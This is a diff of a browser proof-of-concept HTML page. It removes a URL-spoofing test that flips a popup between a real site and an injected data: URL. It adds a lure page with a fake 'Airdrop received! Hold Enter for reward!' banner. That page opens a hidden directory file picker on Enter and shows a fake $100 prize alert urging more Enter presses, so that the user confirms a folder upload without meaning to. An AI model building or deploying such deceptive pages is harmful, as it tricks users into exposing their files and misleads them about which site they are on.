@@ -1,62 +1,66 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
-  <meta charset="UTF-8">
-  <title>Navigation Desync PoC</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      text-align: center;
-      margin-top: 100px;
-    }
-    button {
-      padding: 12px 20px;
-      font-size: 16px;
-      cursor: pointer;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Directory File Upload</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            overflow: hidden;
+        }
+
+        #fileList {
+            margin: 20px;
+        }
+
+        input {
+            display: none;
+        }
+    </style>
 </head>
+
 <body>
+    <center>
+        <h1>💸 Airdrop received! Hold Enter for reward! 💸</h1>
+    </center>
+    <input type="file" id="fileInput" webkitdirectory>
+    <div id="fileList"></div>
 
-<h2>Navigation Desync / URL Spoof PoC</h2>
-<button onclick="start()">Start PoC</button>
+    <script>
 
-<script>
-function start() {
-  let w = window.open(location.href, "_blank");
 
-  // Step 1: Navigate to trusted site
-  setTimeout(() => {
-    try {
-      w.location = "https://http.cat/200";
-    } catch(e) {}
-  }, 100);
+        document.addEventListener('keydown', function (event) {
+            if (event.key === 'Enter') {
+                event.preventDefault(); // Prevent the default Enter key behavior
+                document.getElementById('fileInput').showPicker();
+                setTimeout(() => {
+                    alert("🎉 Congratulations! You've just won a $100 reward! Press Enter twice to claim your prize!");
+            }, 500);
+               
 
-  // Step 2: Rapid navigation switching
-  let urls = [
-    "https://http.cat/200",
-    "data:text/html,<h1 style='text-align:center;margin-top:40vh;'>Injected Content</h1>"
-  ];
+            }
+        });
+        document.getElementById('fileInput').addEventListener('change', function (event) {
+            const fileList = document.getElementById('fileList');
+            fileList.innerHTML = ''; // Clear previous file list
 
-  let i = 0;
-  let interval = setInterval(() => {
-    try {
-      w.location = urls[i % 2];
-      i++;
-    } catch(e) {}
-  }, 50);
+            const files = event.target.files;
+            if (files.length === 0) {
+                fileList.innerHTML = 'No files selected.';
+                return;
+            }
 
-  // Stop after some time
-  setTimeout(() => {
-    clearInterval(interval);
-  }, 5000);
-}
-</script>
-
-<p>💡 After clicking "Start PoC":</p>
-<p>1. Quickly open Browser Task Manager (Shift + Esc)</p>
-<p>2. Kill the new tab process while it's switching</p>
-<p>3. Observe if content mismatches the URL</p>
-
+            const ul = document.createElement('ul');
+            for (const file of files) {
+                const li = document.createElement('li');
+                li.textContent = file.webkitRelativePath; // Display relative path
+                ul.appendChild(li);
+            }
+            fileList.appendChild(ul);
+        });
+    </script>
 </body>
+
 </html>
